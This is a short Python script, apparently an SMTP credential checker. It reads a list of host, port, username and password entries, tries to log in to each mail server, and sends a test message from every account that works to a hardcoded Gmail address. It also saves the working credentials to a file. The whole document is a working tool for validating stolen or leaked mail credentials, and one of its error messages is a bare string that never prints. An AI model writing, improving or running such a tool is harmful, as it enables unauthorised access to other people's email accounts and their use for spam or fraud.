from smtplib import SMTP
from colorama import init
from os import system

system('cls')

credential = {}
email = 'crax6ix@gmail.com'
output = r'success.txt'

def extract_credential(filepath):
    try:
        with open(filepath, 'r') as file:
            file_data = file.readlines()
            try:
                for index, item in enumerate(file_data) :
                    item = item.strip()
                    credential[index]= {'host':item.split('|')[0],
                                        'port':item.split('|')[1],
                                        'username':item.split('|')[2],
                                        'password':item.split('|')[3]}
            except Exception:
                ('Invalid data format !\nYour data must be in this format -> HOST|PORT|USERNAME|PASSWORD')
    except Exception:
        print('Cant open file')



def check_smtp(credential):
    USERNAME = credential['username']
    PASSWORD = credential['password']
    HOST = credential['host']
    PORT = credential['port']
    MSG = "This is smtp checker"

    try:
        with SMTP(HOST, PORT, timeout=10) as smtp_server:
            smtp_server.starttls()
            smtp_server.login(user=USERNAME,
                            password=PASSWORD)
            smtp_server.sendmail(from_addr=credential['username'], 
                                to_addrs=email, 
                                msg=MSG)
        print('-'*100, f'\n[✅] VALID CREDENTIAL FOUND : {HOST}|{PORT}|{USERNAME}|{PASSWORD}')
        with open(output, 'a') as file:
            file.write(f'{HOST}|{PORT}|{USERNAME}|{PASSWORD}\n')
            file.close()
    except Exception:
        print('-'*100, '\n[⚠️] INVALID CREDENTIAL !')


def main():
    extract_credential(r'SMTP-CHECKER\success.txt')
    for i in credential.values():
        check_smtp(i)

main()